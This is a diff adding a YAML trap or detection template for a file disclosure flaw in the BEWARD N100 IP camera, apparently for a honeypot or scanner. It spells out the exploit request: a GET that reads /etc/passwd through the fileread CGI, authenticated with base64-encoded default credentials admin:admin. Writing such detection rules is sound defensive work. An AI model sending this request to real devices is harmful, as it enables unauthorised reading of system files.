@@ -1,0 +1,31 @@
+id: beward-ipcamera-disclosure
+info:
+  name: BEWARD N100 H.264 VGA IP Camera M2.1.6 - Arbitrary File Disclosure
+  author: geeknik
+  description: The N100 compact color IP camera suffers from an authenticated file
+    disclosure vulnerability. Input passed via the READ.filePath parameter in fileread
+    script is not properly verified before being used to read files. This can be exploited
+    to disclose the contents of arbitrary files via absolute path or via the SendCGICMD
+    API.
+  severity: high
+  reference:
+  - https://www.exploit-db.com/exploits/46320
+  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5511.php
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: iot,camera,disclosure,edb
+traps:
+- request:
+    method: GET
+    path: /cgi-bin/operator/fileread?READ.filePath=/etc/passwd
+    headers:
+      Authorization: Basic YWRtaW46YWRtaW4=
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:[x*]:0:0:'
